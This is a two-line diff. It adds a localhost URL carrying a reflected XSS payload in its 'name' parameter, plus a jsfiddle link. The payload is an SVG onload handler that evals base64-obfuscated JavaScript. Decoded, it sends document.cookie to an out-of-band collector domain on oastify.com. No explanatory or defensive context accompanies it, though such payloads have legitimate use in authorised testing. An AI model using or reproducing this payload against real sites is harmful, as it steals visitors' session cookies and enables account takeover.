@@ -1,0 +1,2 @@
+http://localhost:1337/index.php?name=<svg%0Conload="eval(atob('ZmV0Y2goJ2h0dHBzOi8vZm01cTZ3dmk3dnd4YTFmcGpraHc2am14bW9zZmc2ZHUyLm9hc3RpZnkuY29tL2Nvb2tpZT89Jytkb2N1bWVudC5jb29raWUp'));">
+https://jsfiddle.net/23sqP/3/
